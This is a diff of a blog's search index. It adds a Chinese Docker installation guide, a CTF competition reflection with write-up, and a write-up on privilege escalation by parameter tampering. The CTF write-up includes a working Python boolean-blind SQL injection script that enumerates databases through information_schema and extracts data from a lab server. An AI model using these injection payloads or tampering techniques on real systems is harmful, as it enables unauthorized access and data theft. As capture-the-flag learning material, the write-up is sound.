@@ -1,9 +1,22 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[docker]]></title>
+    <url>%2F2018%2F11%2F10%2Fdocker%2F</url>
+    <content type="text"><![CDATA[docker安装环境：ubuntu 16.04.1 lts 安装方法：apt安装 1. 更新软件源中的所有软件列表 apt-get update 2. 安装可选内核模块包 apt-get install \ linux-image-extra-$(uname -r) \ linux-image-extra-virtual 3. 需要添加使用 HTTPS 传输的软件包以及 CA 证书 apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 4. 添加软件源的 GPG 密钥 curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg|apt-key add - 5. 向 source.list 中添加 Docker 软件源 add-apt-repository \ &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 6. 更新 apt 软件包缓存，并安装 docker-ce apt-get update apt-get install docker-ce]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[zjctf]]></title>
+    <url>%2F2018%2F11%2F06%2Fzjctf%2F</url>
+    <content type="text"><![CDATA[浙江省首届大学生网络与信息安全竞赛(专科组)感受 1. 整个比赛时长8小时(8:30-16:30)，包括休息时间，午餐也是在赛场解决，比赛过程中情况都还良好 2. 因为是浙江省第一届的ctf类竞赛，所以这次比赛的题目还是有些水分的，以及题目的类型顺序都是杂乱的，有些不适 3. 从赛后的解题结果来看，杂项的占据了大部分，逆向和pwn以及web体型做出的队伍比较少 4. 遗憾的是这次我们的队伍值解出两题(杂项+web)，但是据说web题只有两队解出来(本科一队，还有我们是一队) 5. 丢分的两道题：第一关卡第一题，没有什么技术含量，需要靠脑洞解题；附加题一题是颜文字解密，由于我们的准备不充足没有提前准备好工具很可惜 6. 杂项的有一题是玩游戏的，是预赛题目的升级版 总结：在杂项上准备不充分，脑洞题目上思路不够开阔 writerup 盲人摸象 提示是注入，测试发现是布尔盲注，这时出现了提示信息了解到关键是需要查询的数据不在当前的数据库中，测试发现=、&gt;等字符被过滤。 id=1和id=1-1返回相同结果猜测是字符型；构造id=0”or 1 和 id=0”or 0 页面会返回不同的结果 ；想到采用 case when … then … else … end 构造条件语句替代后面的1和0 ；测试语句0”or case when(1) then 1 else 0 end– - 返回You find it！ 测试语句0’or case when(0) then 1 else 0 end– - 返回Hide more deep. 这样就有了布尔盲注的基础条件了，接下来就是构造条件。 编写python脚本 12345678910111213141516171819202122232425262728import requestsurl = 'http://172.21.1.102:61234/iFmn2H0UOq/'s=""for x in range(1,200): for i in "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890~`!@\#$%^&amp;*()_+-=&#123;&#125;[]|\\:;\"\'/.,": # 首先查询出当前使用的数据库 # data = &#123;'id': '0" or case when (ord(substr((select database()),'+ str(x) +',1)in(\"' + i + '\"))) then 1 else 0 end-- -','Submit': 'Search'&#125; # 根据提示查询出所有的数据库，发现除了系统自带的和当前使用的tips还有一个叫useless的数据库 # data = &#123;'id': '0" or case when (ord(substr((select group_concat(schema_name) from information_schema.schemata),' + str(x) + ',1))in(ord(\"' + i + '\"))) then 1 else 0 end-- -','Submit': 'Search'&#125; # 然后查询useless库中所有的表，表有很多，最后跑出来最后一个表的名字是zjctf，明显是存放flag的表 # data = &#123;'id': '0" or case when (ord(substr((select group_concat(table_name) from information_schema.tables where table_schema in("useless")),' + str(x) + ',1)in(\"' + i + '\"))) then 1 else 0 end-- -','Submit': 'Search'&#125; # 然后查询表字段只有title和content # data = &#123;'id': '0" or case when (ord(substr((select group_concat(column_name) from information_schema.columns where table_name in("zjctf")),' + str(x) + ',1)in(\"' + i + '\"))) then 1 else 0 end-- -','Submit': 'Search'&#125; # 最后就是查询出表中的数据，中间出了点问题，之前的脚本跑出了flag但是没有用ascii做对比(ord()),前面的因为都是小写所以没有问题，但是flag提交是错误的，添加了ord后跑出了正确的flag data = &#123;'id': '0" or case when (ord(substr((select group_concat(title,content) from useless.zjctf),' + str(x) + ',1))in(ord(\"' + i + '\"))) then 1 else 0 end-- -','Submit': 'Search'&#125; # data = &#123;'id': '0" or case when (substr((select group_concat(content) from tip),' + str(x) + ',1)in(\"' + i + '\")) then 1 else 0 end-- -','Submit': 'Search'&#125; # print data r = requests.post(url, data=data) if "find" in r.content: s = s + i print s break]]></content>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[whalectf]]></title>
     <url>%2F2018%2F10%2F09%2Fwhalectf%2F</url>
-    <content type="text"><![CDATA[基本训练场web密码泄露 进入页面出现登录界面，观察一下发现title是个文件，访问出现密码列表 用burp爆破得到密码 登录时提示失败，检查页面源码发现输入框限制字符长度为5，修改后成功提示：这里没有flag 于是跑去检查响应包，发现响应头有个newpage参数，值是固定的，用base64解开得到一个文件名 访问后是一个留言界面 尝试留言提示未登录，并且页面没有登录入口，于是抓包查看 islogin根据字面意思是用来判断登录状态，尝试修改为1后提交请求，发现留言成功，提示消息变为：你没有权限访问 继续检查请求包，发现有个userlevel参数，可能是用来判断用户权限的字段，尝试修改为admin，xiaohei。 仔细想了想，可能是数据库的默认账户root，提交后发现成功！ 在响应包的setcookie字段得到flag。]]></content>
+    <content type="text"><![CDATA[基本训练场web密码泄露 进入页面出现登录界面，观察一下发现title是个文件，访问出现密码列表 用burp爆破得到密码 登录时提示失败，检查页面源码发现输入框限制字符长度为5，修改后成功提示：这里没有flag 于是跑去检查响应包，发现响应头有个newpage参数，值是固定的，用base64解开得到一个文件名 访问后是一个留言界面 尝试留言提示未登录，并且页面没有登录入口，于是抓包查看 islogin根据字面意思是用来判断登录状态，尝试修改为1后提交请求，发现留言成功，提示消息变为：你没有权限访问 继续检查请求包，发现有个userlevel参数，可能是用来判断用户权限的字段，尝试修改为admin，xiaohei。 仔细想了想，可能是数据库的默认账户root，提交后发现成功！ 在响应包的setcookie字段得到flag。 打卡训练场web【第一期】真的注入]]></content>
       <categories>
         <category>Web-Security</category>
       </categories>
